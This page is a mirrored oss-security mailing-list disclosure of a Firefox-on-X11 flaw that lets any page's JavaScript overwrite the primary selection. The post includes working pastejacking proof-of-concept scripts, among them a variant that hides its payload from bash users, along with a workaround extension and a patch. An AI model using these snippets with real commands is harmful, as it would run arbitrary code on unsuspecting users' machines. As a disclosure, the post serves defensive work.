<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.openwall.com/lists/oss-security/2023/10/17/1">Original</a>
    <h1>With Firefox on X11, any page can pastejack you anytime (middle button paste)</h1>
    
    <div id="readability-page-1" class="page">







<a href="https://miccah.io/2023/10/16/23">[&lt;prev]</a> <a href="https://miccah.io/posts/2">[next&gt;]</a> <a href="https://miccah.io/2023/10/18/3">[thread-next&gt;]</a> <a href="https://miccah.io/posts/">[day]</a> <a href="https://miccah.io/">[month]</a> <a href="https://miccah.io/">[year]</a> <a href="https://miccah.io/">[list]</a>
<pre>Date: Tue, 17 Oct 2023 03:17:36 +0300
From: turistu &lt;turistu@...il.com&gt;
To: oss-security@...ts.openwall.com
Subject: with firefox on X11, any page can pastejack you anytime

Note to the moderator: I have already submitted this to the firefox people
three weeks ago, and according to them, this is not a real security issue,
or at least not worse than those pesky scripts which you cannot kill without
killing firefox itself; if you think the same, just ignore this without
replying.

I would however appreciate if you let this through and so give it some
visibility so that the other 2 or 3 people who may be affected by this
could learn about it.

Thank you very much.

====

In firefox running on X11, any script from any page can freely write to the
primary selection, and that can be easily exploited to run arbitrary code
on the user&#39;s machine.

No user interaction is necessary -- any page able to run javascript can do it,
including e.g. a page from a background tab of a minimized window, an iframe
inside such a window, an error page, a sandboxed iframe, a page that has
reloaded itself via `meta http-equiv=refresh`, etc.

This applies to all the versions of mozilla/firefox and their derivatives
(seamonkey, etc) that I was able to test, including the latest nightly.

### Example

The simplest example, which works in the default configurations of systems
like OpenBSD or Alpine Linux (= any Unix/Linux system where Wayland is not
the default and the default *shell* does not implement bracketed-paste),
would go like this:

Load the following snippet in firefox:

	&lt;pre id=pre style=font-size:0&gt;&lt;/pre&gt;
	intentionally left blank
	&lt;script&gt;
	function writeXPrimary(s){
		pre.textContent = s; getSelection().selectAllChildren(pre);
	}
	setInterval(function(){
		writeXPrimary(&#39;touch ~/LOL-&#39; + Date.now() / 1000 +&#39;\r&#39;)
	}, 500)
	&lt;/script&gt;

Then pretend to forget about it, and go about your work. Sooner or later,
when trying to paste something in the terminal with shift-Insert or middle
click, you will end up running the command `writeXPrimary()` has injected
just between your copy and paste.

live example of that snippet: <a href="https://turistu.github.io/firefox/pastejack.html" rel="nofollow">https://turistu.github.io/firefox/pastejack.html</a>

### Short technical explanation

Browsers like firefox have the concepts of &#34;secure context&#34; (e.g. `https://`)
and &#34;transient user activation&#34;; the javascript from the page gets some
temporary powers as soon as you have interacted *even so little* with the
page, like clicked, touched, etc.

For instance, writing with `Clipboard.writeText()` to the windows-style
Ctrl-C Ctrl-V *clipboard* selection is only possible from secure contexts
and only in the short while after the user has clicked a button, etc on the page.
As this bug demonstrates, those prerequisites are not needed for writing to the
*primary* selection, which on X11 is much more used and much more valuable.

### Workaround

Without patching firefox, the only workaround I can think about is
disabling the `Clipboard.selectAllChildren()` function from an addon&#39;s
content script, e.g. like this:

	let block = function(){ throw Error(&#39;blocked&#39;) };
	exportFunction(block, Selection.prototype, { defineAs: &#39;selectAllChildren&#39; });

Complete extension here at <a href="https://github.com/turistu/odds-n-ends/raw/main/firefox/no-sel.xpi" rel="nofollow">https://github.com/turistu/odds-n-ends/raw/main/firefox/no-sel.xpi</a>.

I tried to submit it to addons.mozilla.org but they didn&#39;t accept it. If
you&#39;re running firefox-esr, the development edition or nightly, you can just
`set xpinstall.signatures.required` to true in `about:config` and install
it with `firefox no-sel.xpi`.

### Firefox Patch
```
diff -r 9b362770f30b layout/generic/nsFrameSelection.cpp
--- a/layout/generic/nsFrameSelection.cpp	Fri Oct 06 12:03:17 2023 +0000
+++ b/layout/generic/nsFrameSelection.cpp	Sun Oct 08 11:04:41 2023 +0300
@@ -3345,6 +3345,10 @@
     return;  // Don&#39;t care if we are still dragging.
   }
 
+  if (aReason &amp; nsISelectionListener::JS_REASON) {
+    return;
+  }
+
   if (!aDocument || aSelection.IsCollapsed()) {
 #ifdef DEBUG_CLIPBOARD
     fprintf(stderr, &#34;CLIPBOARD: no selection/collapsed selection\n&#34;);
```

The idea of this patch was to *always* prevent javascript from indirectly
messing with the primary selection via the Selection API. However, it turned
out that the `JS_REASON` flag was not reliable; if javascript calls some
function like `addRange()` or `selectAllChildren()` while the user has started
dragging but hasn&#39;t released the mouse button yet, that code will be called
*without* that flag but with the text set by javascript, not the text
selected by the user. However, I think that this patch is still enough
to fill the glaring hole opened by `selectAllChildren()`.

### About the example and bracketed-paste

The bracketed paste feature of bash/readline and zsh means that you
cannot just append a CR or LF to the payload and be done, it&#39;s the
user who has to press ENTER for it to run.

However, workarounds exist.  For instance, some terminals like mlterm
don&#39;t filter out the pasted data, and you can terminate the pasting
mode early by inserting a `\e[201~` in the payload.

For bash, you can take advantage of some quirks in the readline library
to turn off the highlighting and make the payload invisible to the user.
E.g.:

	let payload = &#39;touch ~/LOL-&#39; + Date.now() / 1000;
	writeXPrimary(&#39;\n&#39; + payload + &#39;\n&#39;.repeat(100) + &#39; &#39;.repeat(30)
		+ &#39;\n&#39;.repeat(100))

which will confuse the user with the same screen as when some stray background job
had written something to the terminal:

	user@...t:~$ : previous unrelated command
	user@...t:~$	&lt;-- paste here
	#   &lt;-- cursor here, most users will just hit Enter to get a new prompt

live example of that snippet:	<a href="https://turistu.github.io/firefox/bash-pastejack.html" rel="nofollow">https://turistu.github.io/firefox/bash-pastejack.html</a>

Just to be clear, I don&#39;t think that either mlterm, bash, nor the shells that
don&#39;t do have that bracketed-paste feature are at fault here in any way
(and I personally always turn off that misfeature as it badly interferes
with my workflow): It&#39;s firefox which should get all the blame for letting
random javascript evade its pretended &#34;sandbox&#34; in this way.

### About Wayland

For firefox running in Wayland, `writeXPrimary()` will only succeed
when the firefox window (the main window, not necessarily the tab the code
runs in) has the focus. Otherwise the selection will be cleared. At first I
assumed that this is something specific to the Wayland protocol, but that
turned out to be utterly false; it&#39;s just some quirk, bug or &#34;feature&#34;
specific to either firefox itself or GTK.

But I think that&#39;s still bad enough, even if the page should take care to
only set the selection when the main window has gained focus.

And of course, all this doesn&#39;t affect the situation where you&#39;re copying
and pasting in another firefox tab with a different context, origin, etc;
and all the other situations where you don&#39;t appreciate having random
javascript you don&#39;t even know about messing with your copy &amp; paste.

===

This is a slightly edited version of
<a href="https://github.com/turistu/odds-n-ends/blob/main/firefox/pastejack.md" rel="nofollow">https://github.com/turistu/odds-n-ends/blob/main/firefox/pastejack.md</a>.

I will correct any errors or omissions and also add more info there.
</pre>
<p><a href="http://www.openwall.com/blists/">Powered by blists</a> - <a href="http://lists.openwall.net">more mailing lists</a>


</p><p>
Please check out the
<a href="https://oss-security.openwall.org/wiki/">
Open Source Software Security Wiki</a>, which is counterpart to this
<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
</p><p>
Confused about <a href="https://miccah.io/lists/">mailing lists</a> and their use?
<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
and check out these
<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
</p><p>

<a href="https://miccah.io/Owl/" title="Powered by Openwall GNU/*/Linux - security-enhanced &#34;Linux distribution&#34;"><img src="https://miccah.io/Owl/artwork/buttons/80x15/Owl-80x15-4.png" width="80" height="15" alt="Powered by Openwall GNU/*/Linux"/></a>
<a href="https://openvz.org" title="Powered by OpenVZ - OS virtualization solution for Linux"><img src="https://miccah.io/images/OpenVZ-80x15-cd.png" width="80" height="15" alt="Powered by OpenVZ"/></a>





</p></div>
  </body>
</html>
